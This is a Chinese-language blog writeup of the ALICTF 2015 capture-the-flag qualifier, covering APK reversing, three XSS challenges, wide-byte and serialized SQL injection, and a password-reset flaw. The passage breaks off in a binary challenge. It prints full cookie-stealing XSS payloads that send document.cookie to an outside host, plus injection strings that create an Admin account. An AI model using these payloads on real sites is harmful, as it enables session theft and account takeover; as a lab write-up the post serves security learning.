<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="A blog containing some interesting things."><title>ALICTF 2015 初赛Writeup | Beeeの零碎事</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/8.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">ALICTF 2015 初赛Writeup</h1><a id="logo" href="/.">Beeeの零碎事</a><p class="description">Just so so~</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">ALICTF 2015 初赛Writeup</h1><div class="post-meta">Mar 30, 2015</div><div class="post-content"><p>最后得了第二十一，后来看人家的Writeup，发现差距还是很大的，继续学习。</p>
<h3 id="Cake"><a href="#Cake" class="headerlink" title="Cake"></a>Cake</h3><p>这题不难，主要是工具出问题了耽误了时间。最后用Gapktool反编译成java源码，阅读源码得到key的算法。Check()方法中定义了一个长度为16的字符串，将字符串的第i与” bobdylan”的第 i % 8位进行异或，即得key。下面是php实现的算法。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$ai=<span class="keyword">array</span>(<span class="number">0</span>,<span class="number">3</span>,<span class="number">13</span>,<span class="number">19</span>,<span class="number">85</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">78</span>,<span class="number">22</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">68</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">42</span>);</span><br><span class="line">$s1=<span class="keyword">array</span>(<span class="string">'b'</span>,<span class="string">'o'</span>,<span class="string">'b'</span>,<span class="string">'d'</span>,<span class="string">'y'</span>,<span class="string">'l'</span>,<span class="string">'a'</span>,<span class="string">'n'</span>);</span><br><span class="line"></span><br><span class="line">$r=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)</span><br><span class="line">&#123;</span><br><span class="line">    $r.=chr($ai[$i] ^ ord($s1[$i % count($s1)]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $r;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxw0xgwgo3j30j50a8mx0.jpg" alt="cake1-1"></p>
<h3 id="前端初赛题1"><a href="#前端初赛题1" class="headerlink" title="前端初赛题1"></a>前端初赛题1</h3><p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxw0y18ww8j30lw084t9m.jpg" alt="xss1-1"><br>初步测试了一下，过了. “‘()=等，而且题目指定用chrome测试，遂先后尝试了HTML imports， <code>&lt;svg&gt;</code>等方法，最后队友成功利用<code>&lt;svg&gt;</code>构造了个可用payload，本机测试成功，但是当晚提交连接之后却没有记录到cookies。最后经过测试发现是由于我们用了境外的vps来接收cookies导致的，换成国内主机即可。<br>Payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://089d9b2b0de6a319.alictf.com/xss.php?name=&lt;svg&gt;&lt;script&gt;%26%23119%3B%26%23105%3B%26%23110%3B%26%23100%3B%26%23111%3B%26%23119%3B%26%2346%3B%26%23108%3B%26%23111%3B%26%2399%3B%26%2397%3B%26%23116%3B%26%23105%3B%26%23111%3B%26%23110%3B%26%2361%3B%26%2334%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%23109%3B%26%23121%3B%26%2346%3B%26%23104%3B%26%23111%3B%26%23115%3B%26%23116%3B%26%2347%3B%26%23120%3B%26%23115%3B%26%23115%3B%26%2347%3B%26%23119%3B%26%2346%3B%26%23112%3B%26%23104%3B%26%23112%3B%26%2363%3B%26%2399%3B%26%23111%3B%26%23111%3B%26%23107%3B%26%23105%3B%26%23101%3B%26%2361%3B%26%2334%3B%26%2343%3B%26%23117%3B%26%23110%3B%26%23101%3B%26%23115%3B%26%2399%3B%26%2397%3B%26%23112%3B%26%23101%3B%26%2340%3B%26%23100%3B%26%23111%3B%26%2399%3B%26%23117%3B%26%23109%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%2399%3B%26%23111%3B%26%23111%3B%26%23107%3B%26%23105%3B%26%23101%3B%26%2341%3B%26%2359%3B&lt;/script&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
<p>记录到的cookies内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie=flag=aHR0cDovLzA4OWQ5YjJiMGRlNmEzMTkuYWxpY3RmLmNvbS96aGVkYW90aW11X3RlYmllbWVpeW91eWluZ3lhbmcucGhwP3Rva2VuPTJmOGU1OWFmMzhmMjQyMWMwYmI2ODQxODU2ZjhhZjVj</span><br></pre></td></tr></table></figure>
<p>将flag值debase64之后得到链接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://089d9b2b0de6a319.alictf.com/zhedaotimu_tebiemeiyouyingyang.php?token=2f8e59af38f2421c0bb6841856f8af5c</span><br></pre></td></tr></table></figure>
<p>访问得到flag：<code>51bfa0fa2405ef50a0fcf2f12d163e11958edb29</code></p>
<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxw0y82b05j30tl08yabd.jpg" alt="xss1-2"></p>
<p>Payload的大概原理是<code>&lt;script&gt;</code>前的<code>&lt;svg&gt;</code>标签影响了html的解析顺序,导致了<code>&lt;script&gt;</code>标签内的html实体编号先解析，导致了script标签可执行。<br>相关资料：<a href="http://segmentfault.com/q/1010000002391106" target="_blank" rel="noopener">http://segmentfault.com/q/1010000002391106</a></p>
<h3 id="前端初赛题2"><a href="#前端初赛题2" class="headerlink" title="前端初赛题2"></a>前端初赛题2</h3><p>该题目为一个swf文件，用<a href="http://www.showmycode.com/" target="_blank" rel="noopener">http://www.showmycode.com/</a> 反编译一下，得到as源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">package &#123;</span><br><span class="line">    import flash.display.*;</span><br><span class="line">    import flash.events.*;</span><br><span class="line">    import flash.net.*;</span><br><span class="line">    import flash.external.*;</span><br><span class="line"></span><br><span class="line">    public class swf extends Sprite &#123;</span><br><span class="line"></span><br><span class="line">        public function swf()&#123;</span><br><span class="line">            var _local3:*;</span><br><span class="line">            var _local4:*;</span><br><span class="line">            super();</span><br><span class="line">            var _local1:* = root.loaderInfo.parameters;</span><br><span class="line">            var _local2:* = root.loaderInfo.url.indexOf(&quot;?&quot;);</span><br><span class="line">            if (_local2 !== -1)&#123;</span><br><span class="line">                _local3 = this.parseStr(root.loaderInfo.url.substr((_local2 + 1)));</span><br><span class="line">                for (_local4 in _local1) &#123;</span><br><span class="line">                    if (_local3.hasOwnProperty(this.trim(_local4)))&#123;</span><br><span class="line">                        delete _local1[_local4];</span><br><span class="line">                    &#125;;</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;;</span><br><span class="line">            ExternalInterface.call(&quot;console.debug&quot;, _local1.debug);</span><br><span class="line">        &#125;</span><br><span class="line">        public function parseStr(_arg1:String):Object&#123;</span><br><span class="line">            var _local6:Array;</span><br><span class="line">            var _local2:Object = &#123;&#125;;</span><br><span class="line">            _arg1 = unescape(_arg1).replace(/\+/g, &quot; &quot;);</span><br><span class="line">            var _local3:Array = _arg1.split(&quot;&amp;&quot;);</span><br><span class="line">            if (!_local3.length)&#123;</span><br><span class="line">                return (&#123;&#125;);</span><br><span class="line">            &#125;;</span><br><span class="line">            var _local4:uint;</span><br><span class="line">            var _local5:uint = _local3.length;</span><br><span class="line">            while (_local4 &lt; _local5) &#123;</span><br><span class="line">                _local6 = _local3[_local4].split(&quot;=&quot;);</span><br><span class="line">                if (!_local6.length)&#123;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    _local2[this.trim(_local6[0])] = this.trim(_local6[1]);</span><br><span class="line">                &#125;;</span><br><span class="line">                _local4++;</span><br><span class="line">            &#125;;</span><br><span class="line">            return (_local2);</span><br><span class="line">        &#125;</span><br><span class="line">        public function trim(_arg1:String):String&#123;</span><br><span class="line">            if (!_arg1)&#123;</span><br><span class="line">                return (_arg1);</span><br><span class="line">            &#125;;</span><br><span class="line">            return (_arg1.toString().replace(/^\s*/, &quot;&quot;).replace(/\s*$/, &quot;&quot;));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;//package</span><br></pre></td></tr></table></figure>
<p>打开看了一下，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var _local1:* = root.loaderInfo.parameters;//用系统自带的方法取得url参数，为一个对象数组</span><br><span class="line">var _local2:* = root.loaderInfo.url.indexOf(&quot;?&quot;);   //取得url第一个问号的位置</span><br><span class="line">_local3 = this.parseStr(root.loaderInfo.url.substr((_local2 + 1))); //调用自己实现的parser来提取参数</span><br><span class="line">后面大概逻辑就是如果用系统方法获取到的参数对象数组里的参数键名出现在自实现的parser提取到的数组里，则在_local1删掉这个参数。这样导致</span><br><span class="line">ExternalInterface.call(&quot;console.debug&quot;, _local1.debug);</span><br></pre></td></tr></table></figure>
<p>所传递的_local1.debug对象被删掉了，无法利用。这个尝试了很久，由于原来swf没有debug输出，比较难猜测，于是在反编译得到的as源码基础上加上了_local1、<br>root.loaderInfo.url.substr((_local2 + 1)和_local3的debug输出，更好的观察参数传递进去的情况。</p>
<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxw0yhec3nj30zq0qbwfj.jpg" alt="xss2-1"></p>
<p>最后尝试了%00截断，仍然不行，但是此时删掉了一个0，留下%0，发现控制台的undefined提示没有了，也就是说debug参数没有被删除，正确地传进了<code>ExternalInterface.call(&quot;console.debug&quot;, _local1.debug) ;</code>里，进一步调试，最后成功alert。</p>
<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxw0yrr5l3j30hn086gmf.jpg" alt="xss2-2"></p>
<p>最后构造的payload为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://8dd25e24b4f65229.alictf.com/swf.swf?debug%0==123\%22));window.location=%27http://my.host/xss/w.php?cookie=%27.concat(unescape(document.cookie));&#125;catch(e)&#123;&#125;//</span><br></pre></td></tr></table></figure>
<p>本地测试成功，但是提交之后记录不到cookies，怀疑是其中的%0有影响，改成%9在本机测试，依然成功，再次提交，得到cookie:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie=flag=aHR0cDovLzhkZDI1ZTI0YjRmNjUyMjkuYWxpY3RmLmNvbS9uaWppdXNoaV9jaHVhbnNodW96aG9uZ2RlX3hzc194aWFvd2FuZ3ppLnBocD90b2tlbj1kYzk3ZWM3N2E2OGI0MTQxOTA0OTMyODI0NDg5NjRiMw</span><br></pre></td></tr></table></figure>
<p>flag后添加两个==，debase64后得到链接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://8dd25e24b4f65229.alictf.com/nijiushi_chuanshuozhongde_xss_xiaowangzi.php?token=dc97ec77a68b414190493282448964b3</span><br></pre></td></tr></table></figure>
<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxw0yyszvhj30vx08rmyq.jpg" alt="xss2-3"></p>
<p>Payload是碰巧试出来的，后来一想有可能是as脚本将%0这样的字符串当成格式化字符串来处理了，导致问题。</p>
<h3 id="简单业务逻辑"><a href="#简单业务逻辑" class="headerlink" title="简单业务逻辑"></a>简单业务逻辑</h3><p>从注册页面和登陆页面分别得到注册和登陆的业务逻辑。</p>
<p>注册：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- $username = mysqli_real_escape_string($conn, $_POST[&apos;username&apos;]);</span><br><span class="line">$password = mysqli_real_escape_string($conn, $_POST[&apos;password&apos;]);</span><br><span class="line">$sql = &quot;select * from users where username=&apos;$username&apos;&quot;;</span><br><span class="line">if  (0 &lt; mysqli_num_rows(mysqli_query($conn, $sql)) )&#123;</span><br><span class="line">    echo &apos;&lt;h2&gt;Username Has benn used!&lt;/h2&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &apos;&lt;h2&gt;SUCCESS!&lt;/h2&gt;&apos;;</span><br><span class="line">    $sql = &quot;INSERT into users (username, password) values (&apos;$username&apos;, &apos;$password&apos;);&quot;;</span><br><span class="line">    mysqli_query($conn, $sql);</span><br><span class="line">&#125; --&gt;</span><br></pre></td></tr></table></figure>
<p>登陆：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- $username = mysqli_real_escape_string($conn, $_POST[&apos;username&apos;]);</span><br><span class="line">$password = mysqli_real_escape_string($conn, $_POST[&apos;password&apos;]);</span><br><span class="line"></span><br><span class="line">$sql = &quot;SELECT * from users where username=&apos;$username&apos; and password=&apos;$password&apos;;&quot;;</span><br><span class="line">$result = mysqli_query($conn, $sql);</span><br><span class="line">$row = $result-&gt;fetch_assoc();</span><br><span class="line"></span><br><span class="line">if(isset($row) )&#123;</span><br><span class="line">    echo &quot;&lt;h1&gt;Logged in as $username&lt;/h1&gt;&quot;;</span><br><span class="line">    $_SESSION[&apos;username&apos;]=$row[&apos;username&apos;];</span><br><span class="line">    $_SESSION[&apos;password&apos;]=$row[&apos;password&apos;];</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;&lt;h1&gt;Logged Failed&lt;/h1&gt;&quot;;</span><br><span class="line">&#125; --&gt;</span><br></pre></td></tr></table></figure>
<p>可见都用了mysqli_real_escape_string来防注入，看到这个马上想到可能有宽字节注射。简单测试<code>username=123%cf%27%23&amp;password=123123123</code>，多次提交均显示 scuuess，说明select语句正常执行，语句变成：</p>
<p><code>select * from users where username=&#39;123?’#</code></p>
<p>insert into失败，因为用用户名后面注释掉，插入语句变为：</p>
<p><code>Insert into users(username, password) values(‘123?’#,’123123123’);</code></p>
<p>再尝试用密码参数进行注入：</p>
<p>先给username传一个真实不存在的用户：<code>username=donotexist&amp;password=123456789%cf%27)%23</code></p>
<p>第一次提交，success，再次提交用户名已存在，基本确定存在宽字节注入。再来分析业务逻辑：注册的逻辑是先将传入的username带到查询里，看看是否已经存在该用户，不存在的话insert into来插入新用户信息，这里猜测用户表里没有做unique约束。再从主页上看到shop页面是Admin only，构造payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=asdasdasdasdasd&amp;password=123456123456%cf%27),(0x41646d696e,0x41646d696e41646d696e)%23</span><br></pre></td></tr></table></figure>
<p>插入一个用户名Admin，密码AdminAdmin的帐号，成功登录。</p>
<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxw0zjnp5gj31hc0swjw5.jpg" alt="logic1-1"></p>
<p>首页提示flag价值$1000，Admin帐号只有$11，先看看表单。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;td&gt;$1000&lt;/td&gt;</span><br><span class="line">&lt;td&gt;</span><br><span class="line">    &lt;form action=&quot;shooooooooooooooooooooooop.php?token=dc97ec77a68b414190493282448964b3&quot; method=&quot;post&quot; role=&quot;form&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; class=&quot;form-control&quot; name=&quot;num&quot; value=&quot;1&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; class=&quot;form-control&quot; name=&quot;id&quot; value=&quot;6&quot;&gt;</span><br><span class="line">      &lt;button type=&quot;submit&quot; class=&quot;btn btn-default&quot;&gt;Buy&lt;/button&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/td&gt;</span><br></pre></td></tr></table></figure>
<p>发现一个num字段，将其改成0.0001，提交表单，flag跳出来了。</p>
<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxw0zzc7u0j31hc0shjxf.jpg" alt="logic1-2"></p>
<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxw1058tyzj30ea04bt8p.jpg" alt="logic1-3"></p>
<p>该方法在写writeup时无法复现。后来尝试构造超长用户名:Admin(n个空格)n，多次提交均可以注册成功，说明用户名长度超过了用户表中username字段的长度，最后的n被截断，导致将一个Admin用户成功插入到用户表里。</p>
<h3 id="简单业务逻辑2"><a href="#简单业务逻辑2" class="headerlink" title="简单业务逻辑2"></a>简单业务逻辑2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">  function encrypt($plain) &#123;</span><br><span class="line">    $plain = md5($plain);</span><br><span class="line">    $V = md5(&apos;??????&apos;); </span><br><span class="line">    //var_dump($V);</span><br><span class="line">    $rnd = md5(substr(microtime(),11));</span><br><span class="line">    </span><br><span class="line">    //var_dump(substr(microtime(),11)+mt_rand(0,35));</span><br><span class="line">    $cipher = &apos;&apos;;</span><br><span class="line">    for($i = 0; $i &lt; strlen($plain); $i++) &#123;</span><br><span class="line">        $cipher .= ($plain[$i] ^ $rnd[$i]);</span><br><span class="line">    &#125;</span><br><span class="line">    $cipher .= $rnd;</span><br><span class="line">    $V .= strrev($V);</span><br><span class="line">    //var_dump($cipher);</span><br><span class="line">    for($i = 0; $i &lt; strlen($V); $i++) &#123;</span><br><span class="line">        $cipher[$i] = ($cipher[$i] ^ $V[$i]);</span><br><span class="line">    &#125;</span><br><span class="line">    //var_dump($cipher);</span><br><span class="line">    //var_dump($V);</span><br><span class="line">    return str_replace(&apos;=&apos;, &apos;&apos;, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line">function decrypt($cipher) &#123;</span><br><span class="line">    $V = md5(&apos;??????&apos;);</span><br><span class="line">    $cipher_1 = base64_decode($cipher);</span><br><span class="line">    //var_dump($cipher_1);</span><br><span class="line">    if (strlen($cipher_1)!=64)&#123;</span><br><span class="line">    return &apos;xx&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $V .= strrev($V);</span><br><span class="line">    $plain = $cipher_1;</span><br><span class="line">    //var_dump($cipher_1);</span><br><span class="line">    //var_dump($V);</span><br><span class="line">    for($i = 0; $i &lt; strlen($V); $i++) &#123;</span><br><span class="line">        $plain[$i] = ($cipher_1[$i] ^ $V[$i]); </span><br><span class="line">    &#125;</span><br><span class="line">    $ran = substr($plain,32,32);</span><br><span class="line">    $plain = substr($plain,0,32);</span><br><span class="line">    //var_dump($plain);</span><br><span class="line">    for ($i = 0; $i &lt; strlen($ran); $i++) &#123;</span><br><span class="line">    $plain[$i] = ($plain[$i] ^ $ran[$i]);</span><br><span class="line">    &#125;</span><br><span class="line">    //var_dump($plain);</span><br><span class="line">    return $plain;</span><br><span class="line">&#125;</span><br><span class="line">!&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxw1058tyzj30ea04bt8p.jpg" alt="logic2-1"></p>
<p>加密部分算法是上图所示</p>
<p>反过来可以通过包头中时间戳md5后同最终的cipher后32位异或得到反向的V，正序后为4e224df013b3fd4f0de54126186e75de，通过V与最终cipher前32异或得到plain与rnd异或的值，再与rnd异或一次得到md5后的plain，解密后为Guest，将V放入encrypt，plain赋Admin，得到role为Admin的cookie打开网站，进入article页面</p>
<p>在cookie处发现序列化后的参数，尝试注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sql = &quot;1 and 1=2 union select 1,flag from flag&quot;;</span><br><span class="line">echo urlencode(serialize($sql));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>得到flag的地址</p>
<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxw10h8nfyj30u70iemzy.jpg" alt="logic2-2"><br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxw10p96s9j30gr03fwem.jpg" alt="logic2-3"></p>
<p>###业务逻辑和渗透<br>该题也是一个注册和登陆页面，先注册一个试试。要求提供邮箱，想了下还是填个有效的吧，估计会有用。注册完了去重置密码，邮箱收到一个重置链接：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jinan.alictf.com/resetpass/reset.php?pass_token=57b82007a6eb7304ead4080fcc2522c8</span><br></pre></td></tr></table></figure>
<p>重置页面的表单有隐藏字段email，</p>
<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxw10wr5czj30f806p0t5.jpg" alt="reset1-1"></p>
<p>改成重置链接那个发件邮箱<a href="mailto:alictf@189.cn" target="_blank" rel="noopener">alictf@189.cn</a>，新密码填a123456直接提交表单，提示重置成功。用Admin和a123456登陆成功，得到flag。该题的当时没截图，后来无法重现。</p>
<p>###前端初赛题3<br>该题同样是用js实现了一个parser，取得当前url进行解析。先new URL(location.search.substr(1));取得url中？后的字符串，然后用实现的parser对该字符串进行处理，根据处理逻辑可知，？后传入的应该是我们的xss vector，但是要适当构造，绕过parser的判断。</p>
<p>关键在这里</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//parse port</span><br><span class="line">pos = this.authority.indexOf(&apos;:&apos;);</span><br><span class="line">if(pos &gt; -1)&#123;</span><br><span class="line">  this.port = this.authority.substr(pos+1);</span><br><span class="line">  this.authority = this.authority.substr(0, pos)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的port属性后来并没有引用，而最后是要判断authority属性的。所以可以构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ef4c3e7556641f00.alictf.com/xss.php?http://123@notexist.example.com:@x.me/xss/x1.js</span><br></pre></td></tr></table></figure>
<p>这个payload经过自实现的parser后，authority会被赋值为notexist.example.com，port则为@x.me，但是这并不影响，因为port后来并没有引用和判断。而访问该url会被认为是使用帐号<a href="mailto:123@notexist.example.com" target="_blank" rel="noopener">123@notexist.example.com</a>和空密码向x.me 主机请求http基础认证，可以正常访问。提交paylaoad，记录得到cookies。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie=flag=aHR0cDovL2VmNGMzZTc1NTY2NDFmMDAuYWxpY3RmLmNvbS9kYXRvdWVyemlfaGVfd2VpcXVubWFtYV9kZWd1c2hpLnBocD90b2tlbj1kYzk3ZWM3N2E2OGI0MTQxOTA0OTMyODI0NDg5NjRiMw</span><br></pre></td></tr></table></figure>
<p>补等号，debase64得到链接：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ef4c3e7556641f00.alictf.com/datouerzi_he_weiqunmama_degushi.php?token=dc97ec77a68b414190493282448964b3</span><br></pre></td></tr></table></figure>
<p>访问得flag：<br><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxw12zdcckj30wy09pmyo.jpg" alt="xss3-1"></p>
<p>###谁偷了你的站内短信<br>题目提供一个ELF可执行文件，丢IDA看看，由于刚接触二进制逆向，还是先用F5看看吧。<br>发现函数列表里有print_flag函数</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxw15wjlhpj30aq0ghjs6.jpg" alt="pwn1-1"></p>
<p>点进去F5看看</p>
<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxw167gconj30dr064aa6.jpg" alt="pwn1-2"></p>
<p>没错，是读flag的，但是程序中没有调用这个函数的地方，先看看程序功能吧。</p>
<p>主菜单有注册和登陆，登陆之后可以查看收件箱，发件箱，发邮件，查看用户等功能。我注册一个新用户登陆进去之后，发现在我之前已经有一个奇怪的用户存在：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Total 7 records.</span><br><span class="line">[ 0] eaf124c02c4</span><br><span class="line">[ 1] test</span><br><span class="line">[ 2]</span><br><span class="line">[ 3] testtest</span><br><span class="line">[ 4] x</span><br><span class="line">[ 5] 5cff7cab73a</span><br><span class="line">[ 6] admin</span><br></pre></td></tr></table></figure>
<p>序号0那个用户很可疑，队友也说不是他们注册的。再根据ida提供的信息：</p>
<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxw16bi3g2j30is04qaa1.jpg" alt="pwn1-3"></p>
